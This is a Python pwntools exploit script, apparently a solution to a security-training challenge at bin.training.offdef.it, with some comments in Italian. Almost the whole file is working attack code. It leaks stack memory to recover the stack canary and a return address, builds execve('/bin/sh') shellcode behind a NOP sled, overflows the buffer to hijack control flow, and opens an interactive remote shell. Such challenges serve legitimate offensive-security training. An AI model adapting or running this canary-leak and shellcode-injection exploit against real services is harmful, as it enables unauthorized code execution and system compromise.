#! /usr/bin/python3
import sys
import pwn
import time
import copy

def memscan():
    tosend=104*b'A'
    length=[104]
    while len(tosend)<200:
        r.send(tosend+b'A')
        yeet = r.recvuntil("> ")
        out = r.recv()
        #input("wait")
        tosend = out
        length.append(len(tosend))
        if length[-1]==length[-2]:
            break
    #print(length)
    out=bytearray(out)
    for i in length:
        if i < len(out):
            #print("i: "+str(i), end=" ")
            #print(out[i])
            if out[i] == 65:
                #print("sost")
                out[i]=0
    return bytes(out)


pwn.context.log_level='DEBUG'

# per runnare il processo in virtual machine e interagirci da fuori:
# ssh= ssh("username","ip")
# r= ssh.process("./multistage")                    multistage name of the process

pwn.context.terminal = ['tmux', 'split-window', '-h'] #(si può usare screen)
#r = pwn.process("./gonnaleak")
#pwn.gdb.attach(r, '''
#b * 0x004011fc
#c
#''' )

pwn.context.arch="amd64"
#print(len(shellcode))
r=pwn.remote("bin.training.offdef.it",2011)
r.recv()
input("wait")
scan=memscan()
j=0
for i in scan:
    if j%8==0:
        print()
    print(hex(i), end=" ")
    j+=1
canary=scan[104:112]
print("canary:",end=" ")
for i in canary:
    print(hex(i),end=" ")
print()
address=copy.deepcopy(scan[152:160])
address=pwn.packing.u64(address,sign="unsigned",endianness="little")
address-=391
address2=address+90
address=pwn.packing.p64(address,sign="unsigned",endianness="little")
address2=pwn.packing.p64(address2,sign="unsigned",endianness="big")
print("address:",end=" ")
for i in address:
    print(hex(i),end=" ")
assembly= '''
xor rdi,rdi
mov rdi,0x'''+address2.hex()+'''
mov rax,0x3b
xor rsi,rsi
xor rdx,rdx
syscall
'''
shellcode=pwn.asm(assembly)
exploit=(104-len(shellcode)-25)*b'\x90'+shellcode+b'//////////////////bin/sh\x00'+canary+b'\x01\x00\x00\x00\x00\x00\x00\x00'+address          #392 base 10
r.send(exploit)
r.recv()
input("wait")
r.send(b'\x00')
r.interactive()

##r.send(pwn.asm(shellcode2)+b'')
#a=r.recv()
#for byte in a:
#    print(hex(byte), end=' ')
#r.send()
#r.send(len(fragment1)*b'\x90'+pwn.asm(shellcode2)+payload)
#r.interactive()

#sys.stdout.buffer.write(shellcode+(20-len(shellcode))*b'\x41'+payload+pwn.asm(shellcode2))
#input("wait")
#sys.stdout.buffer.write(payload+pwn.asm(shellcode2))
